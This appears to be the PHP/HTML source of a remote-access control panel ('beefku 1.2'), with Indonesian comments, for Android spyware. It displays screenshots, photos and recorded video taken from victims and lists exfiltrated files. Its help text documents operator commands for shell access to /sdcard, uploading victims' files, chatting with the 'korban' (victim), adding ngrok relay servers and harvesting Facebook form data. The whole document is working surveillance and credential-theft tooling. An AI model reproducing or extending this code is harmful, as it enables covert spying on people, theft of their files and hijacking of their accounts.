...
<html>
  <head>
    ...
    <title>TOOLS beefku 1.2 (DEKAT)</title>
    <!--[if IE]><script type="text/javascript" src="excanvas.js"></script><![endif]-->
    <!--ubah akura1.2 dekat/disini dan pfileman.php untuk meningkatkan versi-->
  </head>
  <body>
    ...
    <form action="" method="post">
        ...
        <h3><font color='black'>
            FORM FB : 
            <?php
                $rofile = fopen("swformfb.txt", "r") or die("Gagal membuka file!");
                $sw = fread($rofile, filesize("swformfb.txt"));
                fclose($rofile);
        ...
        <h3>
            <font color='blue'>
                ...
                if (isset($_GET['target'])) {
                    ...
                    echo "<a href='/akura1.2/dekat/pfileman.php?folder=".$dir_target."'> select target </a>";
        ...
        <h5>
            ...
            if (isset($_POST['btnListBaleni'])) {
                ...
                echo $text."<a href='/akura1.2/dekat/payload.php?resethistory='>reset</a>";
            }
            ?>
        </h5>
        ...
        <h3>
            -------------------------- OUTPUT ----------<br><br>
            <a href="/akura1.2/dekat/payload.php?resetoutpayload=">reset</a> <font color='green'>size: 
            <?php 
                function size($size) {
                    $size = max(0, (int)$size);
        ...
        <a href='/akura1.2/dekat/payload.php?img=screen.jpg'> show screen</a><br><br>
        <a href='/akura1.2/dekat/payload.php?img=foto.jpg'> show foto</a><br><br>
        <a href='/akura1.2/dekat/payload.php?video=REC_SYSTEM.mp4'> show video</a><br><br>
        <a href='/akura1.2/dekat/fileman.php?folder=payloadout/'> data payload</a><br><br>
...
if (isset($_GET['client'])) {
    ...
    fwrite($ofile, $data);
    fclose($ofile);
    header("Location: /akura1.2/dekat/payload.php");
}
    ...
    header("Location: /akura1.2/dekat/pfileman.php");
}
    ...
    $dir_target = dirname(__FILE__)."/listclient/";
    header("Location: /akura1.2/dekat/pfileman.php?folder=".$dir_target);
}
...
if(isset($_POST['enter'])) {
    ...
    if ($data == "hidup" || $data == "mati") 
    {
    ...
    } else if ($data == "fbformhidup" || $data == "fbformmati") {
        ...
        echo "<b>-_-</b> untuk mode terminal sbg contoh>> <font color='green'><b>-_-ls /sdcard/</b></font> <br><br>".
            ...
            "<b>-dataFB-</b> : untuk send dataFB yang gagal load contoh <font color='blue'><b>-dataFB-2</b></font> catatan parameter pertama adalah index array<br><br>".
           
            "<b>-fileFB-</b> : DEV untuk send file dalam bentuk hex contoh <font color='blue'><b>-fileFB-/sdcard/foto.jpg</b></font> catatan batas file 300mb<br><br>".

            "<b>-getar-</b> : untuk getar contoh <font color='blue'><b>-getar-3000</b></font> satuan milidetik<br><br>".
            
            "<b>-chat-</b> : untuk chat dengan korban contoh <font color='blue'><b>-chat-Judul-chat-ini pesan</b></font> tunggu korban membalas <br><br>".
            ...
            "<b>-server-</b> : untuk control server contoh <font color='blue'><b>-server-hidup/mati</b></font> catatan untuk mengetahui server run atau tidak gunakan perintah status. ".
            "bisa juga untuk tambah server contoh <font color='blue'><b>-server-add-server-https://ngrok.com/dsdsd</b></font><br><br>".
            ...
            "<b>-up-</b> : untuk upload file contoh <font color='blue'><b>-up-/sdcard/penting.txt</font></b> file disimpan di server folder payloadout. tambahan upload video/audio dan gambar contoh <font color='blue'><b>-up-video/screen/foto</b></font> ".
            "untuk upload file dari remote facebook gunakan ini <br><font color='blue'><b>-up-fb-up-/sdcard/penting.txt</font></b> file disimpan dalam bentuk byte, gunakan asisten apk untuk decoding ke file. tambahan upload video/audio dan gambar contoh <font color='blue'><b>-up-fb-up-video/screen/foto</b></font> jangan lupa setelah selesai gunakan ini <font color='blue'><b>-up-fb-up-reset</b></font><br><br>".
            ...
            "<b>reset</b> : SWITCH harus hidup!! , digunakan untuk reset data internal fb.zip, server.zip dan data.zip tentunya externl storage terhapus juga. catatan switch harus hidup yang pasti link sudah diperbarui(configure.php)<br><br>".
            ...
            "<b>fbformhidup/fbformmati</b> : jika form javascript facebook telah ganti aktifkan ini untuk memperbarui form utama, catatan form harus sudah ditulis di configure.php untuk melihat form gunakan view source pada link fb<br><br>".
